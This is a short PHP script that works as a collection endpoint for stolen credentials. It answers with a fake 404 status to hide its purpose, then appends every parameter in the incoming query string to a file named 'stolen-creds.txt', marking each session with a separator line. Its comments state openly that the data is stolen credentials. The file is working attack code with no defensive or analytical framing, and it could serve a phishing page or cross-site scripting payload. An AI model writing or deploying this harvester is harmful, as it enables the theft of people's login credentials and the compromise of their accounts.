<?php
	// Redirect user to 404 page
	header('HTTP/1.0 404 Not Found');
	//Create file handle
	$handle = fopen("stolen-creds.txt", "a");
	// Store all stolen creds, in a 'key=value' format
	foreach($_GET as $variable => $value) {
		fwrite($handle, "$variable=$value\n");
	}
	// Add separator between different sessions
	fwrite($handle, "----------\n");
	// Drop handle
	fclose($handle);
?>
